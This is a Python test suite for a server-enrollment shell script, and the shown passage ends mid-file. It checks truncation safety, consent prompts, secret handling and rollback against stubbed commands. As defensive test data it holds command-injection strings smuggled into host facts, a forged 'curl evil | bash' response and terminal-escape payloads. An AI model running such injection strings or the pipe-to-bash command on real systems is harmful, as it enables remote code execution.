"""Offline tests for bootstrap/server-enroll.sh; no network, root or host change.

The body is run the way a server runs it: piped into bash, with the final
line Hivra appends. Side-effect commands are stubs on PATH that record every
call (argv and environment) and emulate their effect inside a throwaway test
root. Terminal cases use a real pseudo-terminal as the controlling terminal;
no-terminal cases run in a new session (setsid), where /dev/tty can't open.

The production body is never edited: the test copy appends one function,
hse_init, after the body and before the final line, which is the only change
that points the script at the test root and stubs.

Covers the threats in section 14 of
docs/superpowers/specs/2026-09-24-server-enrollment-command.md that the script
owns: T5, T7, T9 to T14, T28, T30, T35, T38 to T40 and T42, plus dry-run,
re-enrollment and uninstall.
"""
import base64
import concurrent.futures
import fcntl
import hashlib
import json
import os
from pathlib import Path
import re
import select
import shutil
import stat
import subprocess
import sys
import tempfile
import termios
import time
import unittest

HERE = Path(__file__).resolve().parent
BODY = (HERE / "server-enroll.sh").read_bytes()
ORIGIN = "https://hivra.example"
CODE = "hse1_" + "abcdefghijklmnopqrstuvwxyz234567"
ACCOUNT = "K7QM-2XRA"
PREFIX = bytes.fromhex("0000000b7373682d6564323535313900000020")
ADMIN_KEY = "ssh-ed25519 " + base64.b64encode(PREFIX + bytes(range(1, 33))).decode()
HOST_KEY = "ssh-ed25519 " + base64.b64encode(PREFIX + bytes(range(33, 65))).decode()
ENTRY_NAMES = ("hivra_enroll_entry", "hivra_uninstall_entry", "hivra_refuse")
SUDOERS = b"hivra ALL=(ALL:ALL) NOPASSWD: ALL\n"
ENROLLMENT_ID = "11111111-2222-4333-8444-555555555555"


def fingerprint(key):
    blob = base64.b64decode(key.split(" ")[1])
    return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")


HOST_FINGERPRINT = fingerprint(HOST_KEY)
ADMIN_FINGERPRINT = fingerprint(ADMIN_KEY)


def enroll_line(origin=ORIGIN, code=CODE, key=ADMIN_KEY, account=ACCOUNT):
    return ("{ hivra_enroll_entry \"$@\" HIVRA_ARGS_V1 '%s' '%s' '%s' '%s' HIVRA_END_V1; }"
            % (origin, code, key, account)).encode()


def refuse_line(reason):
    return ("{ hivra_refuse '%s'; }" % reason).encode()


UNINSTALL_LINE = b'{ hivra_uninstall_entry "$@" HIVRA_END_V1; }'


def accepted(words="amber-falcon-river", host=None):
    return {"status": 200, "body": "HIVRA_ENROLLMENT v1\nstatus=accepted\nenrollment=%s\nwords=%s\nhost=%s\n"
            % (ENROLLMENT_ID, words, host or HOST_FINGERPRINT)}


def refused(status, http):
    return {"status": http, "body": "HIVRA_ENROLLMENT v1\nstatus=%s\n" % status}


# Stub commands. Every stub appends one JSON line to the fixture's call log
# with its argv and environment, then emulates its effect inside the fixture's
# test root using its state files. $HSE_TEST_CONF names the fixture.
# The stubs run under this very interpreter: the script's fixed PATH may not
# contain it (a container's python3 in /usr/local/bin, for example).
STUB_COMMON = "#!" + sys.executable + "\n" + r'''import json, os, sys
CONF = json.load(open(os.environ["HSE_TEST_CONF"]))
ROOT, STATE, LOG = CONF["root"], CONF["state"], CONF["log"]
NAME = os.path.basename(sys.argv[0])
def log(extra=None):
    entry = {"cmd": NAME, "argv": sys.argv[1:], "env": dict(os.environ)}
    if extra: entry.update(extra)
    with open(LOG, "a") as handle: handle.write(json.dumps(entry) + "\n")
def state(name, default=None):
    path = os.path.join(STATE, name)
    return open(path).read() if os.path.exists(path) else default
def fail(name):
    return os.path.exists(os.path.join(STATE, "fail-" + name))
'''

STUBS = {
    "useradd": r'''
log()
if fail("useradd"): sys.exit(9)
home = sys.argv[sys.argv.index("--home-dir") + 1]
os.makedirs(ROOT + home, exist_ok=True)
open(os.path.join(STATE, "user"), "w").write(home)
''',
    "usermod": "log()\nif fail('usermod'): sys.exit(9)\n",
    "userdel": r'''
import shutil
log()
home = state("user")
if home: shutil.rmtree(ROOT + home, ignore_errors=True)
if os.path.exists(os.path.join(STATE, "user")): os.remove(os.path.join(STATE, "user"))
''',
    "getent": r'''
log()
home = state("user")
if sys.argv[1:] == ["passwd", "hivra"] and home:
    print("hivra:x:1001:1001:Hivra:%s:/bin/bash" % home); sys.exit(0)
sys.exit(2)
''',
    "install": r'''
import shutil
log()
args = sys.argv[1:]
mode = None; directory = False; rest = []
i = 0
while i < len(args):
    if args[i] == "-d": directory = True; i += 1
    elif args[i] in ("-m", "-o", "-g"):
        if args[i] == "-m": mode = int(args[i + 1], 8)
        i += 2
    else: rest.append(args[i]); i += 1
if fail("install") : sys.exit(9)
if directory:
    for path in rest:
        os.makedirs(path, exist_ok=True)
        if mode is not None: os.chmod(path, mode)
else:
    source, target = rest
    if os.path.exists(target): os.remove(target)
    shutil.copyfile(source, target)
    if mode is not None: os.chmod(target, mode)
''',
    "visudo": r'''
content = open(sys.argv[-1], "rb").read()
log({"content": content.decode()})
sys.exit(0 if content.endswith(b"\n") else 1)
''',
    "sudo": r'''
log()
if sys.argv[1:] == ["-l", "-U", "hivra"]:
    if os.path.exists(ROOT + "/etc/sudoers.d/hivra-enrollment") and not fail("sudo-read"):
        print("User hivra may run the following commands:\n    (ALL : ALL) NOPASSWD: ALL"); sys.exit(0)
    print("User hivra is not allowed to run sudo."); sys.exit(1)
sys.exit(1)
''',
    "sshd": r'''
log({"user_exists": state("user") is not None})
# "Match Group" rules apply only once hivra exists: a fixture can give sshd a
# different answer for that case.
text = state("sshd-T-with-user") if state("user") is not None and state("sshd-T-with-user") is not None else state("sshd-T")
if text is None: sys.exit(255)
sys.stdout.write(text)
''',
    "ssh-keygen": r'''
import base64, hashlib
log()
args = sys.argv[1:]
if "-y" in args:
    path = args[args.index("-f") + 1]
    key = state("hostkey:" + os.path.basename(path))
    if key is None: sys.exit(1)
    print(key); sys.exit(0)
if "-l" in args:
    line = open(args[args.index("-f") + 1]).read().split()
    blob = base64.b64decode(line[1])
    print("256 SHA256:%s %s (ED25519)" % (base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("="), line[2] if len(line) > 2 else "no comment"))
    sys.exit(0)
sys.exit(1)
''',
    "hostname": "log()\nsys.stdout.write(state('hostname', 'web-1') + '\\n')\n",
    "uname": "log()\nsys.stdout.write(state('arch', 'x86_64') + '\\n')\n",
    "getconf": "log()\nprint(state('cpus', '4'))\n",
    "systemd-detect-virt": "log()\nprint(state('virt', 'kvm'))\n",
    "sleep": "log()\n",
    "ip": r'''
log()
if sys.argv[1:] == ["-6", "route", "show", "default"] and state("ipv6-route"):
    print("default via fe80::1 dev eth0 proto ra metric 100")
''',
    "loginctl": "log()\n",
    "pkill": "log()\n",
    # No hivra process is left after pkill in the offline runs; the
    # disposable-server check covers a user manager that takes a moment.
    "pgrep": r'''
log()
# A fixture can say how many more checks still find hivra processes.
left = int(state("hivra-processes", "0"))
if left > 0:
    open(os.path.join(STATE, "hivra-processes"), "w").write(str(left - 1))
    sys.exit(0)
sys.exit(1)
''',
    "systemctl": "log()\n",
    "apt-get": "log()\n",
    "apt": "log()\n",
    "mv": "log()\nos.execv('/bin/mv', ['mv'] + sys.argv[1:])\n",
    "rm": "log()\nos.execv('/bin/rm', ['rm'] + sys.argv[1:])\n",
    "curl": r'''
args = sys.argv[1:]
config = open(args[args.index("--config") + 1]).read()
data_ref = args[args.index("--data-binary") + 1]
body = open(data_ref[1:]).read() if data_ref.startswith("@") else data_ref
family = [a for a in args if a in ("--ipv4", "--ipv6")]
code_on_disk = False
for folder in (ROOT, CONF["tmp"]):
    for base, _, files in os.walk(folder):
        for name in files:
            try:
                if CONF["code"].encode() in open(os.path.join(base, name), "rb").read(): code_on_disk = True
            except OSError: pass
log({"config_has_expected_auth": config == 'header = "Authorization: Bearer %s"\n' % CONF["code"],
     "body": body, "family": family, "url": args[-1], "code_on_disk": code_on_disk})
responses = json.load(open(os.path.join(STATE, "responses.json")))
index_path = os.path.join(STATE, "response-index")
index = int(state("response-index", "0"))
open(index_path, "w").write(str(index + 1))
response = responses[min(index, len(responses) - 1)]
if family == ["--ipv6"]: response = CONF.get("ipv6_response") or {"rc": 7}
if "rc" in response:
    sys.stdout.write("000"); sys.exit(response["rc"])
out = args[args.index("--output") + 1]
open(out, "wb").write(response["body"].encode("latin-1"))
sys.stdout.write(str(response["status"]))
''',
}

_SHARED_STUBS = []


def shared_stubs():
    """One stub folder for the whole run: a new executable is slow to start
    the first time on some systems, and every fixture uses the same stubs."""
    if not _SHARED_STUBS:
        folder = Path(tempfile.mkdtemp(prefix="hse-stubs-"))
        write_stubs(folder, STUBS)
        _SHARED_STUBS.append(folder)
    return _SHARED_STUBS[0]


def write_stubs(folder, stubs):
    for name, source in stubs.items():
        path = folder / name
        path.write_text(STUB_COMMON + source)
        path.chmod(0o755)


def tearDownModule():
    for folder in _SHARED_STUBS:
        shutil.rmtree(folder, ignore_errors=True)


SSHD_T = """port 22
pubkeyauthentication yes
authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2
hostkey /etc/ssh/ssh_host_rsa_key
hostkey /etc/ssh/ssh_host_ecdsa_key
hostkey /etc/ssh/ssh_host_ed25519_key
usepam yes
"""

OS_RELEASE = 'PRETTY_NAME="Ubuntu 24.04 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\nID=ubuntu\n'


class Fixture:
    """A test root, stub PATH and scenario for one run."""

    def __init__(self, test, own_stubs=False):
        self.dir = Path(tempfile.mkdtemp(prefix="hse-test-"))
        test.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)
        self.root = self.dir / "root"
        self.state = self.dir / "state"
        self.stubs = self.dir / "stubs"
        self.tmp = self.dir / "tmp"
        self.log = self.dir / "calls.jsonl"
        for path in (self.root, self.state, self.stubs, self.tmp, self.root / "etc/ssh/sshd_config.d",
                     self.root / "etc/sudoers.d", self.root / "proc", self.root / "home"):
            path.mkdir(parents=True, exist_ok=True)
        (self.root / "etc/os-release").write_text(OS_RELEASE)
        (self.root / "proc/meminfo").write_text("MemTotal:       16337216 kB\nMemFree:  1 kB\n")
        (self.root / "etc/ssh/sshd_config").write_text("Include /etc/ssh/sshd_config.d/*.conf\nPasswordAuthentication no\n")
        self.set_state("sshd-T", SSHD_T)
        self.set_state("hostkey:ssh_host_ed25519_key", HOST_KEY + " root@web-1")
        self.set_state("hostkey:ssh_host_rsa_key", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC root@web-1")
        self.responses([accepted()])
        self.config = {"root": str(self.root), "state": str(self.state), "log": str(self.log), "code": CODE,
                       "tmp": str(self.tmp)}
        self.config_path = self.dir / "stub-config.json"
        self.config_path.write_text(json.dumps(self.config))
        self.shared = None if own_stubs else shared_stubs()
        if own_stubs:
            write_stubs(self.stubs, STUBS)
        self.euid = 0

    def write_stubs(self, stubs):
        write_stubs(self.stubs, stubs)

    def path(self):
        return ":".join([str(self.stubs)] + ([str(self.shared)] if self.shared else []) + ["/usr/bin", "/bin"])

    def remove_stub(self, name):
        (self.stubs / name).unlink()

    def set_state(self, name, value):
        (self.state / name).write_text(value)

    def responses(self, responses, ipv6=None):
        self.set_state("responses.json", json.dumps(responses))
        if ipv6 is not None:
            self.config["ipv6_response"] = ipv6
            self.config_path.write_text(json.dumps(self.config))

    def proxmox(self, version):
        """A Proxmox VE server: pveversion exists only there, so its stub goes
        in this fixture's own stub folder."""
        self.set_state("pveversion", "pve-manager/%s/abcdef (running kernel: 6.8.4-2-pve)" % version)
        write_stubs(self.stubs, {"pveversion": "log()\nsys.stdout.write(state('pveversion', '') + '\\n')\n"})

    def create_user(self):
        (self.root / "home/hivra/.ssh").mkdir(parents=True, exist_ok=True)
        self.set_state("user", "/home/hivra")

    def write_marker(self, status="reported", date="2026-09-20"):
        (self.root / "etc/hivra").mkdir(parents=True, exist_ok=True)
        (self.root / "etc/hivra/enrollment.json").write_text(json.dumps({
            "version": 1, "status": status, "scriptVersion": "2026.09.24.1", "origin": ORIGIN,
            "adminKeyFingerprint": ADMIN_FINGERPRINT, "hostKeyFingerprint": HOST_FINGERPRINT,
            "writtenAt": date + "T12:03:41Z"}, separators=(",", ":")) + "\n")

    def init_override(self):
        return ("\nhse_init() {\n"
                "  PATH='%s'\n  LC_ALL=C\n  export PATH LC_ALL\n"
                "  hse_root='%s'\n  hse_root_uid=%d\n  hse_euid=%d\n  hse_tty=/dev/tty\n"
                "  hse_home=/home/hivra\n}\n") % (self.path(), self.root, os.getuid(), self.euid)

    def script(self, final_line, newline=True):
        return BODY + self.init_override().encode() + final_line + (b"\n" if newline else b"")

    def env(self):
        return {"PATH": self.path(), "HOME": str(self.dir), "TMPDIR": str(self.tmp),
                "LC_ALL": "C", "TERM": "dumb", "HSE_TEST_CONF": str(self.config_path)}

    def calls(self, name=None):
        if not self.log.exists():
            return []
        entries = [json.loads(line) for line in self.log.read_text().splitlines() if line]
        return [entry for entry in entries if name is None or entry["cmd"] == name]

    def run(self, final_line=None, args=(), terminal=False, answers=(), newline=True, script=None, timeout=30,
            umask=0o022):
        payload = script if script is not None else self.script(final_line or enroll_line(), newline)
        if terminal:
            return self._run_terminal(payload, args, answers, timeout)
        result = subprocess.run(["bash", "-s", "--", *args], input=payload, capture_output=True,
                                env=self.env(), cwd=str(self.dir), timeout=timeout, start_new_session=True,
                                preexec_fn=lambda: os.umask(umask))
        return result.returncode, (result.stdout + result.stderr).decode("utf-8", "replace")

    def _run_terminal(self, payload, args, answers, timeout):
        script_path = self.dir / "piped-script.sh"
        script_path.write_bytes(payload)
        master, slave = os.openpty()

        def controlling_terminal():
            os.setsid()
            fcntl.ioctl(slave, termios.TIOCSCTTY, 0)

        # stdin is the script file, like the pipe from curl; /dev/tty is the pty.
        with open(script_path, "rb") as stdin:
            process = subprocess.Popen(["bash", "-s", "--", *args], stdin=stdin, stdout=slave, stderr=slave,
                                       env=self.env(), cwd=str(self.dir), preexec_fn=controlling_terminal,
                                       close_fds=True, pass_fds=(slave,))
        os.close(slave)
        output = b""
        pending = list(answers)
        deadline = time.time() + timeout
        while True:
            if time.time() > deadline:
                process.kill()
                raise AssertionError("script timed out:\n" + output.decode("utf-8", "replace"))
            ready, _, _ = select.select([master], [], [], 0.1)
            if ready:
                try:
                    chunk = os.read(master, 4096)
                except OSError:
                    chunk = b""
                if not chunk and process.poll() is not None:
                    break
                output += chunk
                if pending and re.search(rb"\[y/N\] $", output):
                    os.write(master, pending.pop(0).encode() + b"\n")
                    output += b"<answered>"
            elif process.poll() is not None:
                break
        process.wait()
        os.close(master)
        return process.returncode, output.decode("utf-8", "replace").replace("\r\n", "\n")

    def reports(self):
        return [entry for entry in self.calls("curl")]


class ScriptShape(unittest.TestCase):
    def test_body_only_defines_functions_and_runs_nothing(self):
        fixture = Fixture(self)
        code, output = fixture.run(script=BODY)
        self.assertEqual(code, 0)
        self.assertEqual(output, "")
        self.assertEqual(fixture.calls(), [])
        self.assertTrue(BODY.endswith(b"\n"))
        declared = subprocess.run(["bash", "-c", 'source "$1"; declare -F', "bash", str(HERE / "server-enroll.sh")],
                                  capture_output=True, text=True, check=True).stdout.split()
        names = [word for word in declared if word not in ("declare", "-f")]
        self.assertTrue(set(ENTRY_NAMES) <= set(names))
        for name in names:
            for entry in ENTRY_NAMES:
                self.assertFalse(name != entry and entry.startswith(name), "%s is a prefix of %s" % (name, entry))

    def test_body_is_ascii_and_never_evals_or_sources(self):
        text = BODY.decode("ascii")
        code_lines = [line for line in text.splitlines() if not line.lstrip().startswith("#")]
        self.assertFalse(any(re.search(r"\beval\b|(^|\s)source\s|(^|\s)\.\s", line) for line in code_lines))


class Truncation(unittest.TestCase):
    """T7: a cut at any byte of the final line, or at any line of the body,
    runs nothing, not even a command on PATH named like a prefix of an entry."""

    def prefix_stubs(self, fixture):
        stubs = {}
        for entry in ENTRY_NAMES:
            for length in range(1, len(entry)):
                stubs[entry[:length]] = "log({'prefix_stub_ran': True})\n"
        fixture.write_stubs(stubs)

    def assert_nothing_ran(self, fixture, code, output, label):
        self.assertNotEqual(code, 0, label)
        self.assertEqual(fixture.calls(), [], label)
        self.assertNotIn("This will:", output, label)
        self.assertNotIn("Hivra server setup", output, label)
        self.assertNotIn("Hivra didn't accept", output, label)

    def run_all(self, fixture, cases):
        """Run every (label, script, args) case, several at a time: thousands of
        bash runs, each independent. Nothing may run in any of them, so the
        stub call log must still be empty at the end."""
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(2, (os.cpu_count() or 2))) as pool:
            futures = [(label, pool.submit(fixture.run, script=script, args=args)) for label, script, args in cases]
            return [(label, *future.result()) for label, future in futures]

    def test_every_byte_prefix_of_every_final_line_runs_nothing(self):
        fixture = Fixture(self)
        self.prefix_stubs(fixture)
        lines = [enroll_line(), refuse_line("expired_or_used"), refuse_line("missing_code"),
                 refuse_line("fetch_limit"), UNINSTALL_LINE]
        cases = []
        for line in lines:
            for length in range(0, len(line)):
                for newline in (False, True):
                    for args in ((), ("--dry-run",), ("--yes",)):
                        script = BODY + line[:length] + (b"\n" if newline else b"")
                        cases.append(((line[:length], newline, args, length), script, args))
        for (prefix, newline, args, length), code, output in self.run_all(fixture, cases):
            label = "%r newline=%s args=%s" % (prefix, newline, args)
            if length == 0:
                self.assertEqual(output, "", label)
            else:
                self.assertNotEqual(code, 0, label)
                for text in ("This will:", "Hivra server setup", "Hivra didn't accept"):
                    self.assertNotIn(text, output, label)
        self.assertEqual(fixture.calls(), [])

    def test_every_line_prefix_of_the_body_runs_nothing(self):
        fixture = Fixture(self)
        self.prefix_stubs(fixture)
        lines = BODY.split(b"\n")
        cases = [((count, args), b"\n".join(lines[:count]), args)
                 for count in range(0, len(lines)) for args in ((), ("--dry-run",), ("--yes",))]
        for (count, args), _code, output in self.run_all(fixture, cases):
            label = "lines=%d args=%s" % (count, args)
            self.assertNotIn("This will:", output, label)
            self.assertNotIn("Hivra server setup", output, label)
        self.assertEqual(fixture.calls(), [])

    def test_the_complete_line_runs(self):
        fixture = Fixture(self)
        code, output = fixture.run(enroll_line(), args=("--dry-run",))
        self.assertEqual(code, 0, output)
        self.assertIn("This will:", output)

    def test_without_braces_the_entry_refuses_every_short_argument_list(self):
        # The second layer: if the line ever lost its braces, the entry
        # function itself refuses a cut argument list before reading facts.
        fixture = Fixture(self)
        tokens = ['"$@"', "HIVRA_ARGS_V1", "'%s'" % ORIGIN, "'%s'" % CODE, "'%s'" % ADMIN_KEY,
                  "'%s'" % ACCOUNT, "HIVRA_END_V1"]
        for count in range(0, len(tokens)):
            line = ("hivra_enroll_entry " + " ".join(tokens[:count])).encode()
            for args in ((), ("--dry-run",), ("--yes",)):
                code, output = fixture.run(line, args=args)
                self.assertEqual(code, 2, (line, args, output))
                self.assertIn("arrived incomplete", output)
                self.assertEqual(fixture.calls(), [], (line, args))


class ArgumentContract(unittest.TestCase):
    def test_unknown_repeated_or_malformed_arguments_stop_before_any_fact(self):
        fixture = Fixture(self)
        cases = [
            (enroll_line(), ("--verbose",)), (enroll_line(), ("--yes", "--yes")),
            (enroll_line(), ("--dry-run", "--dry-run")), (enroll_line(), ("--dry-run", "--yes", "--yes")),
            (enroll_line(), ("--outbound",)),
            (enroll_line(origin="http://hivra.example"), ()), (enroll_line(origin="https://evil.example/x"), ()),
            (enroll_line(code="hse1_short"), ()), (enroll_line(code=CODE.upper()), ()),
            (enroll_line(key=ADMIN_KEY + "x"), ()), (enroll_line(account="sam@example.com"), ()),
            (enroll_line(account=""), ()), (enroll_line(account="K7QM-2XRI"), ()),
            (b'{ hivra_enroll_entry "$@" HIVRA_ARGS_V1 x HIVRA_END_V1; }', ()),
            (UNINSTALL_LINE, ("--now",)), (UNINSTALL_LINE, ("--yes", "--dry-run")),
            (refuse_line("anything"), ()), (b"{ hivra_refuse; }", ()),
        ]
        for line, args in cases:
            code, output = fixture.run(line, args=args)
            self.assertEqual(code, 2, (line, args, output))
            self.assertIn("arrived incomplete", output)
            self.assertEqual(fixture.calls(), [], (line, args))

    def test_refusal_lines_print_one_sentence(self):
        fixture = Fixture(self)
        for reason, text in (("missing_code", "missing its one-time code"),
                             ("expired_or_used", "expired, was already used"),
                             ("fetch_limit", "downloaded 20 times")):
            code, output = fixture.run(refuse_line(reason))
            self.assertEqual(code, 1)
            self.assertIn(text, output)
            self.assertEqual(fixture.calls(), [])


class Terminal(unittest.TestCase):
    """T5: the prompt names the receiving account and is always asked when a
    terminal exists; --yes counts only without one."""

    def test_yes_flag_still_prompts_on_a_terminal_and_no_changes_nothing(self):
        fixture = Fixture(self)
        code, output = fixture.run(args=("--yes",), terminal=True, answers=("n",))
        self.assertEqual(code, 1, output)
        self.assertIn("Continue? [y/N]", output)
        self.assertIn("This gives the Hivra account with code %s administrator access" % ACCOUNT, output)
        self.assertIn("Continue only if %s is your account code" % ACCOUNT, output)
        self.assertNotIn("@", output.split("This gives")[1])
        self.assertIn("Nothing was changed or sent", output)
        for name in ("useradd", "usermod", "install", "visudo", "curl", "mv"):
            self.assertEqual(fixture.calls(name), [], name)

    def test_empty_answer_is_no(self):
        fixture = Fixture(self)
        code, output = fixture.run(terminal=True, answers=("",))
        self.assertEqual(code, 1)
        self.assertEqual(fixture.calls("useradd"), [])

    def test_no_terminal_and_no_yes_stops_before_sending_or_changing(self):
        fixture = Fixture(self)
        code, output = fixture.run()
        self.assertEqual(code, 1)
        self.assertIn("This needs a terminal to ask you first", output)
        for name in ("useradd", "install", "curl", "visudo"):
            self.assertEqual(fixture.calls(name), [], name)

    def test_no_terminal_with_yes_proceeds_and_reports_no_terminal_consent(self):
        fixture = Fixture(self)
        code, output = fixture.run(args=("--yes",))
        self.assertEqual(code, 0, output)
        self.assertIn("This will:", output)  # The plan is still printed.
        self.assertIn("/enroll/uninstall | sudo bash", output)
        report = json.loads(fixture.reports()[0]["body"])
        self.assertEqual(report["consent"], "no_terminal")

    def test_terminal_yes_reports_terminal_consent_and_prints_the_words(self):
        fixture = Fixture(self)
        code, output = fixture.run(terminal=True, answers=("y",))
        self.assertEqual(code, 0, output)
        self.assertIn("Done. Hivra shows the same three words: amber falcon river.", output)
        report = json.loads(fixture.reports()[0]["body"])
        self.assertEqual(report["consent"], "terminal")


class Enrollment(unittest.TestCase):
    def run_enroll(self, fixture, **kwargs):
        kwargs.setdefault("args", ("--yes",))
        return fixture.run(**kwargs)

    def test_exact_changes_report_and_marker(self):
        fixture = Fixture(self)
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        useradd = fixture.calls("useradd")[0]["argv"]
        self.assertEqual(useradd, ["--create-home", "--home-dir", "/home/hivra", "--user-group", "--shell",
                                   "/bin/bash", "--comment", "Hivra", "hivra"])
        self.assertEqual(fixture.calls("usermod")[0]["argv"], ["-p", "*", "hivra"])
        self.assertEqual((fixture.root / "home/hivra/.ssh/authorized_keys").read_bytes(),
                         ("restrict %s hivra-enrollment\n" % ADMIN_KEY).encode())
        self.assertEqual((fixture.root / "etc/sudoers.d/hivra-enrollment").read_bytes(), SUDOERS)
        visudo = fixture.calls("visudo")[0]
        self.assertEqual(visudo["argv"][0], "-cf")
        self.assertEqual(visudo["content"], SUDOERS.decode())
        self.assertFalse((fixture.root / "etc/sudoers.d/.hivra-enrollment.new").exists())
        installs = [call["argv"] for call in fixture.calls("install")]
        self.assertIn(["-d", "-m", "0700", "-o", "hivra", "-g", "hivra", str(fixture.root) + "/home/hivra/.ssh"], installs)
        self.assertIn(["-d", "-m", "0755", "-o", "root", "-g", "root", str(fixture.root) + "/etc/hivra"], installs)
        self.assertTrue(any(argv[:6] == ["-m", "0440", "-o", "root", "-g", "root"] for argv in installs))
        self.assertTrue(any(argv[:6] == ["-m", "0600", "-o", "hivra", "-g", "hivra"] for argv in installs))
        self.assertTrue(any(argv[:6] == ["-m", "0644", "-o", "root", "-g", "root"] for argv in installs))
        reports = fixture.reports()
        self.assertEqual(len(reports), 1)
        self.assertTrue(reports[0]["config_has_expected_auth"])
        self.assertEqual(reports[0]["family"], ["--ipv4"])
        self.assertEqual(reports[0]["url"], ORIGIN + "/api/infrastructure/server-enrollments/report")
        report = json.loads(reports[0]["body"])
        self.assertEqual(report, {
            "version": 1, "scriptVersion": "2026.09.24.1", "kind": "enrolled", "consent": "no_terminal",
            "hostPublicKey": HOST_KEY, "adminKeyFingerprint": ADMIN_FINGERPRINT, "sshPort": 22,
            "reenrollment": False,
            "facts": {"hostname": "web-1", "osId": "ubuntu", "osVersionId": "24.04", "architecture": "x86_64",
                      "cpuCount": 4, "memoryBytes": 16337216 * 1024, "virtualization": "kvm",
                      "proxmoxVersion": None, "sshMatchRules": False}})
        marker = json.loads((fixture.root / "etc/hivra/enrollment.json").read_text())
        self.assertEqual(marker["status"], "reported")
        self.assertEqual(marker["enrollment"], ENROLLMENT_ID)
        self.assertEqual(marker["hostKeyFingerprint"], HOST_FINGERPRINT)
        self.assertNotIn("connected", json.dumps(marker))
        self.assertIn("Done. Hivra shows the same three words: amber falcon river.", output)

    def test_modes_are_explicit_under_umask_077(self):
        fixture = Fixture(self)
        code, output = fixture.run(args=("--yes",), umask=0o077)
        self.assertEqual(code, 0, output)
        mode = lambda path: stat.S_IMODE(os.stat(fixture.root / path).st_mode)
        self.assertEqual(mode("etc/hivra"), 0o755)
        self.assertEqual(mode("etc/hivra/enrollment.json"), 0o644)
        self.assertEqual(mode("etc/sudoers.d/hivra-enrollment"), 0o440)
        self.assertEqual(mode("home/hivra/.ssh/authorized_keys"), 0o600)
        self.assertEqual(mode("home/hivra/.ssh"), 0o700)

    def test_the_code_is_never_in_argv_environment_or_files(self):
        # T11: the only place the code travels is a curl config read from a pipe.
        fixture = Fixture(self)
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        for call in fixture.calls():
            self.assertNotIn(CODE, json.dumps(call["argv"]), call["cmd"])
            self.assertNotIn(CODE, json.dumps(call["env"]), call["cmd"])
        self.assertTrue(fixture.reports()[0]["config_has_expected_auth"])
        self.assertFalse(fixture.reports()[0]["code_on_disk"])
        for folder in (fixture.root, fixture.tmp):
            for path in folder.rglob("*"):
                if path.is_file():
                    self.assertNotIn(CODE.encode(), path.read_bytes(), str(path))
        self.assertNotIn(CODE, output)
        self.assertEqual(list(fixture.tmp.iterdir()), [])  # The temporary folder is removed.

    def test_only_the_report_is_sent_and_nothing_is_installed(self):
        # T35: no downloads, packages, services or other network calls.
        fixture = Fixture(self)
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        self.assertEqual(len(fixture.calls("curl")), 1)
        for name in ("apt-get", "apt", "systemctl"):
            self.assertEqual(fixture.calls(name), [], name)

    def test_hostile_facts_are_dropped_not_interpreted(self):
        # T9: values that don't match their pattern are sent as null and never run.
        fixture = Fixture(self)
        pwned = fixture.dir / "pwned"
        (fixture.root / "etc/os-release").write_text(
            'ID="ubuntu$(touch %s)"\nVERSION_ID="24.04`touch %s`"\n' % (pwned, pwned))
        fixture.set_state("hostname", "web-1;touch %s" % pwned)
        fixture.set_state("virt", "kvm$(touch %s)" % pwned)
        fixture.set_state("cpus", "4 && touch %s" % pwned)
        fixture.set_state("sshd-T", SSHD_T.replace("port 22", "port 22$(touch %s)" % pwned))
        code, output = self.run_enroll(fixture)
        self.assertFalse(pwned.exists())
        # Unknown OS and port make it unsupported/unusable: nothing was sent
        # with a bad value, and nothing ran.
        for call in fixture.reports():
            report = json.loads(call["body"])
            self.assertIsNone(report["facts"]["osId"])
            self.assertIsNone(report["facts"]["hostname"])
            self.assertIsNone(report["facts"]["virtualization"])
            self.assertIsNone(report["facts"]["cpuCount"])

    def test_hostile_hostname_alone_is_sent_as_null(self):
        fixture = Fixture(self)
        fixture.set_state("hostname", 'web-1"},"x":{"')
        code, output = self.run_enroll(fixture)
        self.assertEqual(code, 0, output)
        report = json.loads(fixture.reports()[0]["body"])
        self.assertIsNone(report["facts"]["hostname"])

    def test_hostile_acknowledgements_are_failures_and_never_printed(self):
        # T10.
        for body in ("HIVRA_ENROLLMENT v1\nstatus=accepted\nenrollment=%s\nwords=amber-falcon-river\nhost=%s\n\x1b[31mRun this\n"
                     % (ENROLLMENT_ID, HOST_FINGERPRINT),
                     "HIVRA_ENROLLMENT v1\nstatus=accepted\nenrollment=%s\nwords=amber\x1b]0;x\x07-falcon-river\nhost=%s\n"
                     % (ENROLLMENT_ID, HOST_FINGERPRINT),
                     "HIVRA_ENROLLMENT v1\nstatus=accepted\nenrollment=%s\nwords=amber-falcon-river\nhost=%s\n"
                     % (ENROLLMENT_ID, fingerprint(ADMIN_KEY)),
                     "HIVRA_ENROLLMENT v1\nstatus=accepted\n" + "x" * 600,
                     "Run: curl evil | bash\n", ""):
            with self.subTest(body=body[:40]):
                fixture = Fixture(self)
                fixture.responses([{"status": 200, "body": body}])
                code, output = self.run_enroll(fixture)
                self.assertEqual(code, 1, output)
                self.assertNotIn("\x1b", output)
                self.assertNotIn("Run this", output)
                self.assertNotIn("curl evil", output)
                self.assertIn("Hivra didn't confirm it received this server's report", output)
                self.assert_rolled_back(fixture)

    def assert_rolled_back(self, fixture):
        self.assertEqual([call["argv"] for call in fixture.calls("userdel")], [["-r", "hivra"]])
        self.assertFalse((fixture.root / "etc/sudoers.d/hivra-enrollment").exists())
        self.assertFalse((fixture.root / "etc/hivra/enrollment.json").exists())
        self.assertFalse((fixture.root / "etc/hivra").exists())
        self.assertFalse((fixture.state / "user").exists())

    def test_definite_refusals_roll_back_with_their_copy(self):
        # T14, T34, T38.
        for response, text in ((refused("not_usable", 401), "was already used"),
                               (refused("private_address", 422), "can't reach servers on private networks"),
                               (refused("ipv4_required", 422), "only reach servers over IPv4"),
                               (refused("invalid_report", 400), "didn't match what this command expects")):
            with self.subTest(response=response["body"]):
                fixture = Fixture(self)
                fixture.responses([response])
                code, output = self.run_enroll(fixture)
                self.assertEqual(code, 1, output)
                self.assertIn(text, output)
                self.assertIn("This server undid every change.", output)
